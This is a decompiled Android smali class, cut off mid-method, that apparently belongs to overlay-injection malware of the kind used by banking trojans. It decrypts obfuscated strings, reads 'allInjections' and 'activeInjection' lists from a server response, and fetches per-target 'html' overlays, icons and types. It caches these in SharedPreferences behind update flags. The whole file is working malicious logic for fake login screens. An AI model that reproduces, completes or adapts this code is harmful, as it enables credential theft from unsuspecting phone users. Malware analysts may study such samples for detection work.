.class public final Lh0/b;
.super Ljava/lang/Object;
.source ""


# static fields
.field public static final a:Lh0/b;


# direct methods
.method public static constructor <clinit>()V
    .locals 2

    new-instance v0, Lh0/b;

    invoke-direct {v0}, Lh0/b;-><init>()V

    sput-object v0, Lh0/b;->a:Lh0/b;

    const-class v0, Lh0/b;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    const-string v1, " >> "

    invoke-static {v0, v1}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final a(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    instance-of v0, p2, Lh0/b$a;

    if-eqz v0, :cond_0

    move-object v0, p2

    check-cast v0, Lh0/b$a;

    iget v1, v0, Lh0/b$a;->i:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lh0/b$a;->i:I

    goto :goto_0

    :cond_0
    new-instance v0, Lh0/b$a;

    invoke-direct {v0, p0, p2}, Lh0/b$a;-><init>(Lh0/b;Ll0/d;)V

    :goto_0
    iget-object p2, v0, Lh0/b$a;->g:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lh0/b$a;->i:I

    const-string v3, ""

    const/4 v4, 0x1

    if-eqz v2, :cond_2

    if-ne v2, v4, :cond_1

    iget-object p1, v0, Lh0/b$a;->f:Ljava/lang/Object;

    check-cast p1, Landroid/content/Context;

    :try_start_0
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :cond_1
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string p2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p1, p2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1

    :cond_2
    invoke-static {p2}, Lb/a;->C(Ljava/lang/Object;)V

    .line 1
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v2, "NlE3TS83K1ZZUExjZzY5OHE5ZXRpSjB3SFhaMGtHRUczdXNoM01XMWlHWT06Okl4UWJRMlk4YjAzV0FNTjhGMVVwQVE9PQ=="

    invoke-static {p2, v2, v3}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_3

    move-object p2, v3

    .line 2
    :cond_3
    const-string v2, "1"

    invoke-static {p2, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_10

    :try_start_1
    const-string p2, "U0hKMGx2U1c4YnJNRU5aSStSd0Z6N2Q5NWhTMmpxMzRYaE9GUFY3NmRkVT06Ok9vZXZPNnFFeGRiMU9sOUxuQkE2THc9PQ=="

    invoke-static {p2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 3
    sget-object p2, Lb0/b;->a:Lb0/b;

    .line 4
    sget-object p2, Lc0/b;->a:Lc0/b;

    iput-object p1, v0, Lh0/b$a;->f:Ljava/lang/Object;

    iput v4, v0, Lh0/b$a;->i:I

    invoke-virtual {p2, p1, v0}, Lc0/b;->c(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;

    move-result-object p2

    if-ne p2, v1, :cond_4

    return-object v1

    :cond_4
    :goto_1
    check-cast p2, Ljava/lang/String;

    const-string v0, "RESPONCE: "

    invoke-static {v0, p2}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 5
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 6
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string p2, "allInjections"

    invoke-virtual {v0, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string v1, "activeInjection"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    if-eqz p2, :cond_6

    invoke-static {p2}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v2, :cond_5

    goto :goto_2

    :cond_5
    move v2, v1

    goto :goto_3

    :cond_6
    :goto_2
    move v2, v4

    :goto_3
    const-string v5, "OFB2Y3BHVUI2VWJKRjFTOFhQRVdKaVNUNkhwVjNlY0tPYk9PZkVvdUxabz06OkJuZE5vN3RBc2dsUHRkZThvdngrb3c9PQ=="

    const-string v6, "aVo5VFV6OE9uRHQxZXIxc3RJSmhidz09OjpBNzdoRmZkVGxIdlAzdi9zVlQ0bXlBPT0="

    if-nez v2, :cond_c

    :try_start_2
    const-string v2, "~no~"

    invoke-static {p2, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-nez v2, :cond_c

    :try_start_3
    const-string v2, "allInjections"

    invoke-static {p2, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    new-array v2, v4, [Ljava/lang/String;

    const-string v7, ";"

    aput-object v7, v2, v1

    const/4 v7, 0x6

    invoke-static {p2, v2, v1, v1, v7}, Ly0/h;->a0(Ljava/lang/CharSequence;[Ljava/lang/String;ZII)Ljava/util/List;

    move-result-object v2

    new-array v7, v1, [Ljava/lang/String;

    invoke-interface {v2, v7}, Ljava/util/Collection;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v2

    if-eqz v2, :cond_b

    check-cast v2, [Ljava/lang/String;

    array-length v7, v2

    add-int/lit8 v7, v7, -0x1

    if-ltz v7, :cond_a

    move v8, v1

    :goto_4
    add-int/lit8 v9, v8, 0x1

    aget-object v10, v2, v8

    invoke-interface {v10}, Ljava/lang/CharSequence;->length()I

    move-result v10

    if-lez v10, :cond_7

    move v10, v4

    goto :goto_5

    :cond_7
    move v10, v1

    :goto_5
    if-eqz v10, :cond_8

    aget-object v10, v2, v8

    invoke-static {p1, v10, v3}, Ls0/c;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v10, "icon_"

    aget-object v11, v2, v8

    invoke-static {v10, v11}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-static {p1, v10, v3}, Ls0/c;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v10, "type_"

    aget-object v11, v2, v8

    invoke-static {v10, v11}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-static {p1, v10, v3}, Ls0/c;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v10, "Initialization Injection: "

    aget-object v8, v2, v8

    invoke-static {v10, v8}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 7
    sget-object v8, Lb0/b;->a:Lb0/b;

    :cond_8
    if-le v9, v7, :cond_9

    goto :goto_6

    :cond_9
    move v8, v9

    goto :goto_4

    .line 8
    :cond_a
    :goto_6
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-static {v6}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-interface {p1, v2, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 9
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 10
    const-string p1, "1"

    .line 11
    sget-object p2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p2

    const-string v2, "whileStartUpdateInjection"

    invoke-interface {p2, v2, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p2}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string p1, "NkRUUHZ6NXNyV1RsNm4zWXVERDdtdnBkZVZuV1dFS3BQMkYzNS9QcGl2RT06Onpza3JFTGlMdE5OVWZiWFlFZDVxaGc9PQ=="

    .line 12
    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 13
    sget-object p1, Lb0/b;->a:Lb0/b;

    goto :goto_7

    .line 14
    :cond_b
    new-instance p1, Ljava/lang/NullPointerException;

    const-string p2, "null cannot be cast to non-null type kotlin.Array<T>"

    invoke-direct {p1, p2}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw p1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :catch_0
    :try_start_4
    const-string p1, "YWlDK0lReXRkcWlkV2ROeStrMkxhUlJ2eGJsQ0VVcVIrNTMzRFQyNjBZVUNvRHl1WUl4ZU41U0JmZnh3NlFvZkRVK3hUR09TUG9SaDRvUmdRVkNoMUE9PTo6ZHA3ZGlUMGc0RGpUSDlBZnNBSkExQT09"

    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 15
    sget-object p1, Lb0/b;->a:Lb0/b;

    goto :goto_7

    .line 16
    :cond_c
    const-string p1, "~no~"

    invoke-static {p2, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_d

    .line 17
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-static {v6}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 18
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-static {v5}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_d
    :goto_7
    if-eqz v0, :cond_f

    .line 19
    invoke-static {v0}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_e

    goto :goto_8

    :cond_e
    move v4, v1

    :cond_f
    :goto_8
    if-nez v4, :cond_10

    const-string p1, "~no~"

    invoke-static {v0, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_10

    const-string p1, "activeInjection"

    invoke-static {v0, p1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 20
    sget-object p1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {p1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string p2, "activeInjection"

    invoke-interface {p1, p2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_9

    :catchall_0
    move-exception p1

    .line 21
    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_10
    :goto_9
    sget-object p1, Lj0/g;->a:Lj0/g;

    return-object p1
.end method

.method public final b(Landroid/content/Context;Ll0/d;)Ljava/lang/Object;
    .locals 19
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ll0/d<",
            "-",
            "Lj0/g;",
            ">;)",
            "Ljava/lang/Object;"
        }
    .end annotation

    move-object/from16 v0, p2

    instance-of v1, v0, Lh0/b$b;

    if-eqz v1, :cond_0

    move-object v1, v0

    check-cast v1, Lh0/b$b;

    iget v2, v1, Lh0/b$b;->n:I

    const/high16 v3, -0x80000000

    and-int v4, v2, v3

    if-eqz v4, :cond_0

    sub-int/2addr v2, v3

    iput v2, v1, Lh0/b$b;->n:I

    goto :goto_0

    :cond_0
    new-instance v1, Lh0/b$b;

    move-object/from16 v2, p0

    invoke-direct {v1, v2, v0}, Lh0/b$b;-><init>(Lh0/b;Ll0/d;)V

    :goto_0
    iget-object v0, v1, Lh0/b$b;->l:Ljava/lang/Object;

    sget-object v3, Lm0/a;->c:Lm0/a;

    iget v4, v1, Lh0/b$b;->n:I

    const-string v5, ""

    const-string v6, "context"

    const/4 v7, 0x1

    const/4 v8, 0x0

    if-eqz v4, :cond_2

    if-ne v4, v7, :cond_1

    iget v4, v1, Lh0/b$b;->k:I

    iget v9, v1, Lh0/b$b;->j:I

    iget v10, v1, Lh0/b$b;->i:I

    iget v11, v1, Lh0/b$b;->h:I

    iget-object v12, v1, Lh0/b$b;->g:Ljava/lang/Object;

    check-cast v12, [Ljava/lang/String;

    iget-object v13, v1, Lh0/b$b;->f:Ljava/lang/Object;

    check-cast v13, Landroid/content/Context;

    :try_start_0
    invoke-static {v0}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto/16 :goto_4

    :catchall_0
    move-exception v0

    goto/16 :goto_a

    :cond_1
    new-instance v0, Ljava/lang/IllegalStateException;

    const-string v1, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {v0, v1}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw v0

    :cond_2
    invoke-static {v0}, Lb/a;->C(Ljava/lang/Object;)V

    .line 1
    :try_start_1
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v4, "whileStartUpdateInjection"

    invoke-interface {v0, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_3

    move-object v0, v5

    .line 2
    :cond_3
    const-string v4, "1"

    invoke-static {v0, v4}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_14

    const-string v0, "MTJkRE5UZkt5SElmcHRqQ1BOaGJnTFViWjNmVUQ5SmZ1ZUQzcEcrSGorOD06Om1rcVp2a3BlQlV2U0J5TjR0WWtOTEE9PQ=="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 3
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 4
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v4, "arrayInjection"

    invoke-interface {v0, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_4

    move-object v0, v5

    :cond_4
    new-array v4, v7, [Ljava/lang/String;

    .line 5
    const-string v9, ";"

    aput-object v9, v4, v8

    const/4 v9, 0x6

    invoke-static {v0, v4, v8, v8, v9}, Ly0/h;->a0(Ljava/lang/CharSequence;[Ljava/lang/String;ZII)Ljava/util/List;

    move-result-object v0

    new-array v4, v8, [Ljava/lang/String;

    invoke-interface {v0, v4}, Ljava/util/Collection;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    if-eqz v0, :cond_13

    check-cast v0, [Ljava/lang/String;

    array-length v4, v0

    add-int/lit8 v4, v4, -0x1

    if-ltz v4, :cond_11

    move-object v12, v0

    move v9, v4

    move v4, v8

    move v11, v4

    move-object/from16 v0, p1

    :goto_1
    add-int/lit8 v10, v4, 0x1

    const-string v13, "Name Inject: "

    invoke-static {v13, v12}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 6
    sget-object v13, Lb0/b;->a:Lb0/b;

    .line 7
    aget-object v13, v12, v4

    invoke-interface {v13}, Ljava/lang/CharSequence;->length()I

    move-result v13
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-lez v13, :cond_5

    move v13, v7

    goto :goto_2

    :cond_5
    move v13, v8

    :goto_2
    if-eqz v13, :cond_f

    :try_start_2
    aget-object v13, v12, v4

    .line 8
    invoke-static {v0, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v14, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v14, :cond_6

    const-string v14, "settings"

    invoke-virtual {v0, v14, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v14

    sput-object v14, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_6
    sget-object v14, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v14}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v15, 0x0

    invoke-interface {v14, v13, v15}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 9
    invoke-static {v13}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v13}, Ljava/lang/CharSequence;->length()I

    move-result v13

    if-nez v13, :cond_7

    move v13, v7

    goto :goto_3

    :cond_7
    move v13, v8

    :goto_3
    if-eqz v13, :cond_f

    sget-object v13, Lc0/b;->a:Lc0/b;

    aget-object v14, v12, v4

    iput-object v0, v1, Lh0/b$b;->f:Ljava/lang/Object;

    iput-object v12, v1, Lh0/b$b;->g:Ljava/lang/Object;

    iput v11, v1, Lh0/b$b;->h:I

    iput v10, v1, Lh0/b$b;->i:I

    iput v9, v1, Lh0/b$b;->j:I

    iput v4, v1, Lh0/b$b;->k:I

    iput v7, v1, Lh0/b$b;->n:I

    invoke-virtual {v13, v0, v14, v1}, Lc0/b;->b(Landroid/content/Context;Ljava/lang/String;Ll0/d;)Ljava/lang/Object;

    move-result-object v13
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-ne v13, v3, :cond_8

    return-object v3

    :cond_8
    move-object/from16 v18, v13

    move-object v13, v0

    move-object/from16 v0, v18

    :goto_4
    :try_start_3
    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Ly0/f;->M(Ljava/lang/CharSequence;)Z

    move-result v14

    xor-int/2addr v14, v7

    if-eqz v14, :cond_e

    new-instance v14, Lorg/json/JSONObject;

    invoke-direct {v14, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "html"

    invoke-virtual {v14, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v15
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    const/16 v7, 0xa

    const-string v16, "SDdEeDJMaHhWYWZPb0FScFozakRWZz09Ojo0V0QrdUNtZkxMUk04RmM3Q0dhbDVRPT0="

    if-le v15, v7, :cond_a

    :try_start_4
    aget-object v15, v12, v4

    .line 10
    invoke-static {v13, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v17, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v17, :cond_9

    invoke-static/range {v16 .. v16}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v13, v7, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    sput-object v7, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_9
    sget-object v7, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v7}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    invoke-interface {v7, v15, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v7}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v0, "aVl6VWI2VkxFS3Bqc1RCeHFuZkIzMDlxZndnWk4wV1ZLbFF6NHZ5THB6Yz06OkdtYmF4VzBaV29GQTA4eFFtWjY3SHc9PQ=="

    .line 11
    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    aget-object v0, v12, v4

    const-string v0, "NmRoZ0Mrd2pwaFhodlF4NXFoaXVBZz09OjprMW8zbkJZcHFWWkhRb08rbkVqOCtRPT0="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 12
    sget-object v0, Lb0/b;->a:Lb0/b;

    goto :goto_5

    :cond_a
    const-string v0, "bG9PWVJBZlFVR3FDMWpXSGYxN3ZEMm9tc2FNL2tmdFZVNXB3Y3lqbnY1az06OnphVXB6RENIOXZqTXVlZVJ3ZS9wa2c9PQ=="

    .line 13
    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    aget-object v0, v12, v4

    const-string v0, "RjFzT0dUYWExQy95Ulp6c1RCK1VSZz09Ojp0TVRXYUgyS09NWSs1cC9JRFcyRUJRPT0="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 14
    sget-object v0, Lb0/b;->a:Lb0/b;

    add-int/lit8 v11, v11, 0x1

    .line 15
    :goto_5
    const-string v0, "icon"

    invoke-virtual {v14, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    const/16 v15, 0xa

    if-le v7, v15, :cond_c

    const-string v7, "icon_"

    aget-object v15, v12, v4

    invoke-static {v7, v15}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    .line 16
    invoke-static {v13, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v15, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v15, :cond_b

    invoke-static/range {v16 .. v16}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v13, v15, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    sput-object v15, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_b
    sget-object v15, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v15}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v15}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    invoke-interface {v15, v7, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v0, "WWFkbWVnbFdrOEQxcE8xeXpuaVNaYStnQVRyanZqd3BJdGdmT0FTV1ZLRT06OnlUcUtsWEUrd00vZlZ5K1d0WjFyVEE9PQ=="

    .line 17
    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    aget-object v0, v12, v4

    const-string v0, "OWxtSUNISVJGUEFSNmIrV1hycy9UUT09OjpETFpSSXV2d2FmSDBkbmhGZFArT3ZRPT0="

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 18
    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 19
    :cond_c
    const-string v0, "type"

    invoke-virtual {v14, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v7, "type_"

    aget-object v14, v12, v4

    invoke-static {v7, v14}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    .line 20
    invoke-static {v13, v6}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v14, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v14, :cond_d

    invoke-static/range {v16 .. v16}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v14

    sput-object v14, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_d
    sget-object v14, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v14}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v14}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v14

    invoke-interface {v14, v7, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v14}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string v7, "Ry9UK25pSnhkQTRPVE1FOElVS2lYaGJQMmRuK1YzRzZNSDVZMm42d3dwZz06OnpOTi9TRGZEbDhVd2hBMm12Nlk5clE9PQ=="

    .line 21
    invoke-static {v7}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    aget-object v4, v12, v4

    const-string v4, "T2g2WUlVQTdEbllHaURkdkJlMFJzZz09OjpYYWtDaU5mZGNoa2NtWXYzUFhnUkNBPT0="

    invoke-static {v4}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    .line 22
    sget-object v0, Lb0/b;->a:Lb0/b;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_6

    :cond_e
    add-int/lit8 v11, v11, 0x1

    goto :goto_6

    :catch_0
    move-object v13, v0

    :catch_1
    :try_start_5
    const-string v0, "cUdxeGRuRjhqTUFZTy9iOXpFdHBqaTA5L1B1bHdEVFgzNklmNmhQbFpZUT06Omp0aTM3cUh1N3JwY1h4SmZ0dkM4T2c9PQ=="

    .line 23
    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 24
    sget-object v0, Lb0/b;->a:Lb0/b;

    :goto_6
    move v4, v10

    move-object v0, v13

    goto :goto_7

    :cond_f
    move v4, v10

    :goto_7
    if-le v4, v9, :cond_10

    move v8, v11

    goto :goto_8

    :cond_10
    const/4 v7, 0x1

    goto/16 :goto_1

    :cond_11
    :goto_8
    if-nez v8, :cond_12

    .line 25
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "whileStartUpdateInjection"

    invoke-interface {v0, v1, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

